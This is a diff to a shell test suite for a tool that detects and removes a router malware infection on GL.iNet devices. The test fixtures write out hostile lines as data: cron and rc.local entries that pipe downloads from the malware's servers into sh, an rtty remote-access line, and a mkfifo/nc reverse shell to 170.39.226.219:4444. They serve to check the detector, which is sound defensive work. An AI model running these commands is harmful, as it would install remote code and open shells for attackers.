@@ -479,7 +479,7 @@ expect "a netstat link to busybox made since the attack = IOC installer-trace" '
 expect "another new link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/mytool" "$D/check.txt" | grep -q "busybox"'
 expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc.user.d/10-mine" "$D/check.txt"'
 expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
-expect "an autostart file with a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
+expect "an autostart file that fetches from a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
 expect "the loader is recognised by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analysed loader"'
 expect "GoodCloud state, client version, binding and remote access are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4), bound to an account: on" "$D/check.txt" && grep -q "Remote access  *SSH: on, web: off (through GoodCloud)" "$D/check.txt"'
 umount "$D/m"
@@ -491,7 +491,7 @@ sed -i "s/option enable '0'/option enable '1'/" "$U/etc/config/gl-cloud"
 expect "with GoodCloud on, the run ends with the advice to switch it off and the command" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "GoodCloud is ON on this device" "$D/check.txt" && grep -q "uci set .gl-cloud.@cloud\[0\].enable=0." "$D/check.txt" && grep -q "gl-cloud disable" "$D/check.txt"'
 expect "the account's address is not printed anywhere" '! grep -q "someone@example" "$D/check.txt"'
 expect "compiled Lua elsewhere in the overlay: the loader by its names is IOC, other bytecode REVIEW" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt" && grep -q "REVIEW  *lua-bytecode  */usr/lib/other.luac" "$D/check.txt" && ! grep -q "lua-bytecode.*plain.txt" "$D/check.txt"'
-expect "gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
+expect "a fetch from gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
 umount "$D/m"
 
 echo "=== what the installer leaves (topic 73056, post 90)"
@@ -528,6 +528,43 @@ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "IOC, verdict INFECTED, and the result does not promise that --fix removes it (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *rtty-server  */etc/rtty_conf" "$D/check.txt" && grep -q "Verdict: INFECTED" "$D/check.txt" && grep -q "rtty-server: --fix does NOT change /etc/rtty_conf" "$D/check.txt" && ! grep -qF -- "--fix removes it" "$D/check.txt"'
 run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
 expect "--fix changes nothing, says why and exits 1, not 0 (exit $rc)" '[ $rc = 1 ] && grep -q "65.20.71.131" "$D/m/etc/rtty_conf" && grep -q "Nothing was changed" "$D/fix.txt" && grep -q "rtty_conf still names" "$D/fix.txt" && ! grep -q "No IOC found" "$D/fix.txt"'
+umount "$D/m"
+
+echo "=== a server of the malware: what a line does with it decides (issue 20)"
+# An owner who blocks the servers names them as well. A block is INFO and stays, a name
+# alone is REVIEW and stays, and only a line that fetches from a server is the malware.
+D=$(mkscen srvblock "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults"
+printf '#!/bin/sh\n# block 65.20.71.131 and 66.245.219.252 (CSA-2026-01)\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I OUTPUT -d 66.245.219.252 -j REJECT\nip route add blackhole 65.20.71.131\nnft add rule inet fw4 output ip daddr 66.245.219.252 drop\n' >"$U/etc/hotplug.d/iface/99-block-csa"
+printf '#!/bin/sh\necho "0.0.0.0 gl-inet.top" >>/etc/hosts\n' >"$U/etc/uci-defaults/99-null-host"
+printf '#!/bin/sh\nping -c 1 gl-inet.top >/tmp/top.log\n# wget http://65.20.71.131:8000/ni.sh, as in the forum\n' >"$U/etc/init.d/zz-watch"
+printf '# my own\n/root/start-vpn.sh\niptables -I OUTPUT -d 66.245.219.252 -j DROP\nexit 0\n' >"$U/etc/rc.local"
+echo '0 4 * * * /root/backup.sh' >"$U/etc/crontabs/root"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "blocks are INFO server-block, a name alone REVIEW server-ref, no IOC (exit $rc)" '[ $rc = 0 ] && grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt" && grep -q "INFO  *server-block  */etc/uci-defaults/99-null-host" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/zz-watch" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
+expect "a block in rc.local is said on its PERSIST line" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "blocks a server of the malware (66.245.219.252)"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix leaves the block script, rc.local and the crontab as they are (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && [ -f "$D/m/etc/init.d/zz-watch" ] && grep -q start-vpn "$D/m/etc/rc.local" && grep -q backup.sh "$D/m/etc/crontabs/root"'
+umount "$D/m"
+
+D=$(mkscen srvfetch "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/tmp/gl_crontabs" "$U/etc/gl_crontabs/crontabs.d"
+printf 'wget -qO- http://65.20.71.131:8000/ni.sh | sh\nexit 0\n' >"$U/etc/rc.local"
+echo '*/3 * * * * curl -s http://gl-inet.top:8899/x | sh' >"$U/etc/crontabs/root"
+printf '#!/bin/sh\niptables -I OUTPUT -d 65.20.71.131 -j DROP; uclient-fetch -O /tmp/x http://66.245.219.252:8000/n5\n' >"$U/etc/hotplug.d/iface/98-both"
+printf '#!/bin/sh\nH=65.20.71.131\nwget -O /tmp/x "http://$H:8000/ni.sh"\n' >"$U/etc/init.d/zz-indirect"
+printf '0 4 * * * /usr/bin/own-job\n*/3 * * * * wget -qO- http://gl-inet.top:8899/w | sh\n' >"$U/tmp/gl_crontabs/root"
+printf '30 3 * * * /usr/bin/gl-own-task\n*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a\n' >"$U/etc/gl_crontabs/crontabs.d/tasks"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "a fetch from a server in rc.local and the root crontab is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server of the malware (65.20.71.131)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "gl-inet.top"'
+expect "a line that blocks and fetches counts as fetching" 'grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/98-both" "$D/check.txt"'
+expect "fetch lines in the firmware's crontabs are IOC cron-ref" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt"'
+expect "a server named in a variable is REVIEW, not IOC (the limit of the line rule)" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-indirect" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix resets rc.local and the crontab and removes the fetching file (exit $rc)" '[ $rc = 2 ] && ! grep -q 65.20.71.131 "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/hotplug.d/iface/98-both" ] && [ -f "$D/m/etc/init.d/zz-indirect" ]'
+expect "--fix drops only the fetch lines from the firmware's crontabs" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q gl-inet.top "$D/m/tmp/gl_crontabs/root" && grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q rtty "$D/m/etc/gl_crontabs/crontabs.d/tasks"'
 umount "$D/m"
 
 echo "=== rc.local with only the firmware's own lines is not a change"
@@ -726,6 +763,24 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	echo 'another build' >"$L/tmp/ujaild (deleted)"; ln -s '/tmp/ujaild (deleted)' "$L/proc/4242/exe"
 	live --no-report >"$L/check.txt"; rc=$?
 	expect "ujaild with another hash is still IOC backdoor-proc, not called the known one" '[ $rc = 1 ] && grep -A1 "IOC  *backdoor-proc  *4242" "$L/check.txt" | grep -q "older backdoor: comm=ujaild" && ! grep -q "known second stage" "$L/check.txt"'
+	# Processes that only name a server, the shell's address or a path of the malware are
+	# not the malware (issues 7 and 20): REVIEW, or INFO for a block, and never stopped.
+	# Only --check runs here: these numbers are not processes of the chroot.
+	fp() { mkdir -p "$L/proc/$1"; echo "$2" >"$L/proc/$1/comm"; printf "$3" >"$L/proc/$1/cmdline"; ln -s /bin/busybox "$L/proc/$1/exe"; }
+	fp 5001 sh 'sh\0-c\0sleep 60; : ping gl-inet.top\0'
+	fp 5002 tcpdump 'tcpdump\0-ni\0any\0host\000170.39.226.219\0'
+	fp 5003 less 'less\0/tmp/gl-helper.log\0'
+	fp 5004 iptables 'iptables\0-I\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
+	fp 5005 wget 'wget\0-qO-\0http://65.20.71.131:8000/ni.sh\0'
+	fp 5006 nc 'nc\000170.39.226.219\0004444\0'
+	fp 5007 cat 'cat\0/tmp/f\0'
+	fp 5008 sh '/bin/sh\0/etc/glinet/.cache/watch.sh\0'
+	fp 5009 sh 'sh\0-c\0rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 4444 >/tmp/f\0'
+	live --no-report >"$L/procs.txt"
+	expect "a process that only names a server, the address or a path is REVIEW" 'grep -A1 "REVIEW  *process  *5001" "$L/procs.txt" | grep -q "names a server of the malware, but does not fetch" && grep -A1 "REVIEW  *process  *5002" "$L/procs.txt" | grep -q "not made like it" && grep -A1 "REVIEW  *process  *5003" "$L/procs.txt" | grep -q "names a path of the malware, but does not run it" && ! grep -qE "IOC  *process  *500[123]" "$L/procs.txt"'
+	expect "a process that blocks a server is INFO" 'grep -q "INFO  *process  *5004" "$L/procs.txt" && ! grep -qE "(IOC|REVIEW)  *process  *5004" "$L/procs.txt"'
+	expect "a fetch, nc, cat of the pipe, the malware's script and the reported shell line are IOC" 'grep -A1 "IOC  *process  *5005" "$L/procs.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *process  *5006" "$L/procs.txt" | grep -q "remote shell reported" && grep -q "IOC  *process  *5007" "$L/procs.txt" && grep -q "IOC  *process  *5008" "$L/procs.txt" && grep -A1 "IOC  *process  *5009" "$L/procs.txt" | grep -q "remote shell reported"'
+	rm -r "$L"/proc/500?
 	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
 	# The chroot gets a base image with the same busybox and an iptables-save that prints
 	# the rule the attack leaves; first the same file in the system, then a changed one.
